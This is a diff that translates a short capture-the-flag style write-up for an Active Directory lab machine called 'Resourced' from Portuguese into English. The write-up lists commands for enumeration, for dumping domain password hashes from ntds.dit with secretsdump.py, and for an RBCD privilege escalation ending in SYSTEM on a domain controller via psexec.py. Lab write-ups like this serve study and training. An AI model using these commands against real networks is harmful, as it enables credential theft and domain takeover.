@@ -1,7 +1,7 @@
 # Resourced
 > ntds.dit + SYSTEM + RBCD
 
-## Enumeração
+## Enumeration
 
 ```
 nmap -sC -sV -oN nmap.txt <IP>
@@ -11,23 +11,23 @@ nmap -sC -sV -oN nmap.txt <IP>
 enum4linux-ng -A <IP>
 ```
 
-Compartilhamento SMB acessível com credenciais encontradas.
+SMB share accessible with found credentials.
 
-## Exploração
+## Exploitation
 
-Dump do `ntds.dit` via SMB ou serviço exposto:
+`ntds.dit` dump via SMB or exposed service:
 
 ```
 secretsdump.py <user>:<pass>@<IP>
 ```
 
-Hashes extraídos do `ntds.dit` e arquivo `SYSTEM`.
+Hashes extracted from `ntds.dit` and `SYSTEM` file.
 
 ```
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
-## Escalada de Privilégio
+## Privilege Escalation
 
 Resource-Based Constrained Delegation (RBCD):
 
@@ -38,4 +38,4 @@ export KRB5CCNAME=administrator.ccache
 psexec.py -k -no-pass <DC>.<domain>
 ```
 
-SYSTEM no Domain Controller obtido.
+SYSTEM on Domain Controller obtained.
